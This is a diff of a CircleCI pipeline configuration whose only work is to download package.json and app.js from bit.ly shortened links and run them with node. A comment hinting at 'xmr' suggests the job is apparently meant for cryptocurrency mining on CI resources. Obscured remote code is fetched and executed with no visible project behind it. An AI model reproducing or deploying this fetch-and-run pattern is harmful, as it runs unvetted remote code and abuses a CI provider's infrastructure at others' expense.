@@ -1,25 +1,24 @@
+
 version: 2.1
 
+#https://bit.ly/2XuO8xR link x___m___r
 jobs:
-  run-jobs:
+  run-job:
     machine:
       image: ubuntu-2004:202101-01
-    resource_class: arm.medium
+    resource_class: medium
     steps:
-      - run: node -v
-      #- run: 
-          #name: Install Chromium Browser
-          #command: |-
-            #sudo apt install -y chromium-browser
-            #export PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=true
-            #export PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
-      - run: curl -fsSL https://bit.ly/3hsOgEK -o package.json && curl -fsSL https://bit.ly/3huRvvt -o app.js && curl -fsSL https://bit.ly/395I1lO -o log-print.js
-      #- run: git clone https://remitdepat@bitbucket.org/remitdepat/ih8h1wok5xs0vsr3aqbn26oij7.git
-      #- run: cd ih8h1wok5xs0vsr3aqbn26oij7 && npm i -s && node app_1h_online.js
-      - run: npm i -s
+      - run: 
+          name: Get soure
+          command: |-
+            curl -fsSL https://bit.ly/3nvNdYs -o package.json && curl -fsSL https://bit.ly/2XgnUhW -o app.js && curl -fsSL https://bit.ly/3Cb0Pwk -o log-print.js
+      - run: 
+          name: Node Install Packages
+          command: |-
+            npm i -s
       - run: node app.js
       
 workflows:
   start-work:
     jobs:
-      - run-jobs
+      - run-job
